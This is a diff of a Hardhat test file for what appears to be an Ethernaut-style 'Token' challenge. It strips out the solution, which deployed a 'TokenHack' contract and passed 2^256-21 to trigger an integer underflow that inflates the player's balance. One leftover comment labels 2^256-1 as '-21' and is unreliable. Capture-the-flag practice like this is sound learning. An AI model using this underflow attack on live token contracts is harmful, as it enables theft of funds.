@@ -47,7 +47,7 @@ const abi = [
   },
 ];
 
-const contractLevel = "0xf4bc97bB219b0EEAC88C8E00318B45719b5e6A9C";
+const contractLevel = "0x4926C33e59eB9CE1c99F123230B5045986cB2f76";
 
 before(async () => {
   [eoa] = await ethers.getSigners();
@@ -57,29 +57,8 @@ before(async () => {
   console.log(`eoa address: ${JSON.stringify(eoa.address)}`);
 });
 
-it("solves the challenge", async () => {
-  let playerBalance = await challenge.balanceOf(eoa.address);
-  console.log(`playerAddress: ${JSON.stringify(eoa.address)}`);
-  console.log(`playerBalance: ${JSON.stringify(playerBalance.toString())}`);
-  let ownerBalance = await challenge.balanceOf(
-    "0xe5a35680edf93e87222a11fe461b0ada743d6201"
-  );
-  console.log(`ownerBalance: ${JSON.stringify(ownerBalance.toString())}`);
+it("solves the challenge", async () => {});
 
-  let tokenHackFactory = await ethers.getContractFactory("TokenHack");
-  let tokenHack = await tokenHackFactory.deploy(challenge.address);
-  await tokenHack.deployed();
-
-  let tx = await tokenHack.attack(
-    eoa.address,
-    ethers.BigNumber.from(2).pow(256).sub(21)
-  );
-  tx.wait(1);
-  playerBalance = await challenge.balanceOf(eoa.address);
-  console.log(`playerAddress: ${JSON.stringify(eoa.address)}`);
-  console.log(`playerBalance: ${JSON.stringify(playerBalance.toString())}`);
-});
-//-21: 115792089237316195423570985008687907853269984665640564039457584007913129639935;
 after(async () => {
   expect(await submitLevel(challenge.address), "level not solved").to.be.true;
 });
